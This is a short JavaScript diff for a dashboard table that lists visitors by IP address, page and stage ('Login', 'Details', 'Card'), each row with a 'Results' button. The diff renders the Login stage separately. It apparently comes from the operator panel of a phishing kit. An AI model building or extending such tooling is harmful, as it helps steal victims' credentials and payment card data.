@@ -141,8 +141,16 @@
         color = details.status === 'actif' ? 'success' : 'danger'; // Use success for actif, danger otherwise
     }
             const row = document.createElement('tr');
-          if(details.stage == 'Login' || details.stage == 'Details' || details.stage == 'Card'){
+          if(details.stage == 'Details' || details.stage == 'Card'){
             row.innerHTML = `
+                <td><span class="badge bg-${color}">${details.status}</span></td>
+                <td>${ipAddress}</td>
+                <td>${details.page || ''}</td>
+                <td>${details.stage || ''}</td>
+                <td><button class="btn btn-primary results-button">Results</button> </td> <!-- Action column -->
+            `;
+          } else if(details.stage == 'Login'){
+                        row.innerHTML = `
                 <td><span class="badge bg-${color}">${details.status}</span></td>
                 <td>${ipAddress}</td>
                 <td>${details.page || ''}</td>
